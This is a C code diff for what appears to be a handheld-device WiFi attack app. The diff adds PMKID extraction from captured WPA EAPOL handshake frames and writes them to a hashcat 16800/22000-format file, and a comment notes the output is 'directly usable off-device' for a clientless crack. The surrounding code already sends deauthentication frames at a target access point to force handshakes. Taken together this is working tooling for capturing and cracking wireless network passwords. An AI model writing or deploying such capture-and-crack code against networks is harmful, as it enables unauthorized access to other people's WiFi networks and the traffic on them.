@@ -39,8 +39,11 @@ static volatile uint32_t s_read_idx = 0;
 // ---------------------------------------------------------------------------
 typedef struct {
     uint8_t bssid[6];
+    char ssid[33];
     bool has_beacon;
     bool has_m1, has_m2, has_m3, has_m4;
+    bool has_pmkid;
+    uint8_t pmkid[WLAN_HS_PMKID_LEN];
 } HsSingleCapture;
 
 static HsSingleCapture s_single;
@@ -84,6 +87,8 @@ typedef struct {
     char ssid[33];
     bool has_beacon;
     bool has_m1, has_m2, has_m3, has_m4;
+    bool has_pmkid;
+    uint8_t pmkid[WLAN_HS_PMKID_LEN];
     File* pcap_file;
 } HsChannelTarget;
 
@@ -153,6 +158,55 @@ static File* hs_open_pcap(Storage* storage, const char* dir, const char* safe_ss
         }
     }
     return wlan_pcap_open(storage, path);
+}
+
+static void hs_hex_encode(const uint8_t* data, size_t len, char* out) {
+    static const char hex[] = "0123456789abcdef";
+    for(size_t i = 0; i < len; i++) {
+        out[i * 2] = hex[data[i] >> 4];
+        out[i * 2 + 1] = hex[data[i] & 0x0F];
+    }
+    out[len * 2] = '\0';
+}
+
+// Appends one hashcat 16800/22000-style line (pmkid*bssid*station*essid_hex)
+// to <dir>/pmkid.16800 -- the format hashcat/hcxdumptool tooling expects for
+// a clientless PMKID crack, so a capture here is directly usable off-device.
+static void hs_save_pmkid(
+    Storage* storage,
+    const char* dir,
+    const uint8_t* pmkid,
+    const uint8_t* bssid,
+    const uint8_t* station,
+    const char* ssid) {
+    if(!storage || !dir) return;
+    storage_common_mkdir(storage, "/ext/wifi");
+    storage_common_mkdir(storage, dir);
+    char path[200];
+    snprintf(path, sizeof(path), "%s/pmkid.16800", dir);
+
+    char pmkid_hex[WLAN_HS_PMKID_LEN * 2 + 1];
+    char bssid_hex[13];
+    char sta_hex[13];
+    char ssid_hex[67];
+    hs_hex_encode(pmkid, WLAN_HS_PMKID_LEN, pmkid_hex);
+    hs_hex_encode(bssid, 6, bssid_hex);
+    hs_hex_encode(station, 6, sta_hex);
+    size_t ssid_len = strlen(ssid);
+    if(ssid_len > 32) ssid_len = 32;
+    hs_hex_encode((const uint8_t*)ssid, ssid_len, ssid_hex);
+
+    char line[220];
+    int n = snprintf(
+        line, sizeof(line), "%s*%s*%s*%s\n", pmkid_hex, bssid_hex, sta_hex, ssid_hex);
+    if(n <= 0) return;
+
+    File* file = storage_file_alloc(storage);
+    if(storage_file_open(file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
+        storage_file_write(file, line, (uint16_t)n);
+    }
+    storage_file_close(file);
+    storage_file_free(file);
 }
 
 // ---------------------------------------------------------------------------
@@ -355,7 +409,14 @@ static uint8_t hs_process_packet_single(const uint8_t* payload, int len) {
     int eapol_len = len - header_len - 8;
     uint8_t msg = wlan_hs_get_eapol_msg_num(eapol, eapol_len);
     switch(msg) {
-    case 1: s_single.has_m1 = true; break;
+    case 1:
+        s_single.has_m1 = true;
+        if(!s_single.has_pmkid &&
+           wlan_hs_extract_pmkid(eapol, eapol_len, s_single.pmkid)) {
+            s_single.has_pmkid = true;
+            hs_save_pmkid(s_storage, s_save_dir, s_single.pmkid, bssid, station, s_single.ssid);
+        }
+        break;
     case 2: s_single.has_m2 = true; break;
     case 3: s_single.has_m3 = true; break;
     case 4: s_single.has_m4 = true; break;
@@ -439,7 +500,13 @@ static void hsc_process_packet(const uint8_t* payload, int len, uint32_t timesta
     if(!t) return;
     bool was_complete = t->has_m2 && t->has_m3;
     switch(msg) {
-    case 1: t->has_m1 = true; break;
+    case 1:
+        t->has_m1 = true;
+        if(!t->has_pmkid && wlan_hs_extract_pmkid(eapol, eapol_len, t->pmkid)) {
+            t->has_pmkid = true;
+            hs_save_pmkid(s_storage, s_save_dir, t->pmkid, bssid, station, t->ssid);
+        }
+        break;
     case 2: t->has_m2 = true; break;
     case 3: t->has_m3 = true; break;
     case 4: t->has_m4 = true; break;
@@ -511,8 +578,10 @@ static void hsc_drain_and_process(WlanApp* app) {
 
 static void hsc_publish_view(WlanApp* app) {
     uint8_t complete = 0;
+    uint8_t pmkid_count = 0;
     for(int i = 0; i < s_hsc_target_count; i++) {
         if(s_hsc_targets[i].has_m2 && s_hsc_targets[i].has_m3) complete++;
+        if(s_hsc_targets[i].has_pmkid) pmkid_count++;
     }
 
     WlanHsChannelViewModel* m = view_get_model(app->view_handshake_channel);
@@ -520,6 +589,7 @@ static void hsc_publish_view(WlanApp* app) {
     m->running = s_hs_running;
     m->count = s_hsc_target_count;
     m->hs_complete_count = complete;
+    m->pmkid_count = pmkid_count;
     m->deauth_active = app->handshake_deauth_running;
     m->deauth_frames = app->handshake_deauth_count;
     m->auto_mode = s_hsc_auto_mode;
@@ -616,6 +686,7 @@ static void hs_init_single(WlanApp* app) {
     const WlanApRecord* target = hs_pick_target(app);
     if(target) {
         memcpy(s_single.bssid, target->bssid, 6);
+        strncpy(s_single.ssid, target->ssid, sizeof(s_single.ssid) - 1);
         memcpy(s_frame_deauth, deauth_tmpl, 26);
         memcpy(&s_frame_deauth[10], target->bssid, 6);
         memcpy(&s_frame_deauth[16], target->bssid, 6);
@@ -869,6 +940,7 @@ bool wlan_app_scene_handshake_on_event(void* context, SceneManagerEvent event) {
             m->has_m2 = s_single.has_m2;
             m->has_m3 = s_single.has_m3;
             m->has_m4 = s_single.has_m4;
+            m->has_pmkid = s_single.has_pmkid;
             m->complete = app->handshake_complete;
             m->eapol_count = app->handshake_eapol_count;
             m->deauth_frames = app->handshake_deauth_count;
